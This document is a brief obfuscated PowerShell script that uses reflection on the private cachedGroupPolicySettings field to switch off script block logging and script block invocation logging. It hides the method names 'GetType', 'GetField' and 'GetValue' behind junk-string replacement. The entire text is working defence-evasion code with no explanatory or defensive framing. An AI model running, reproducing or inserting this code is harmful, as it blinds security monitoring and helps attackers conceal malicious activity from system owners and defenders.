$oTIfm = 'ogitjRsAogitjRssogitjRssogitjRseogitjRsmogitjRsbogitjRslogitjRsy'.Replace('ogitjRs',''), 'GKbimtGGKbimteGKbimttGKbimtTGKbimtyGKbimtpGKbimteGKbimt'.Replace('GKbimt',''), 'GImsqerGGImsqereGImsqertGImsqerFGImsqeriGImsqereGImsqerlGImsqerdGImsqer'.Replace('GImsqer',''),'GGieSAeGieSAtGieSAVGieSAaGieSAlGieSAuGieSAe'.Replace('GieSA','')


$GroupPolicySettingsField = [ref].($oTIfm[0]).($oTIfm[1])('System.Management.Automation.Utils').($oTIfm[2])('cachedGroupPolicySettings', 'NonPublic,Static'); 
$GroupPolicySettings = $GroupPolicySettingsField.($oTIfm[3])($null)
$GroupPolicySettings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
$GroupPolicySettings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0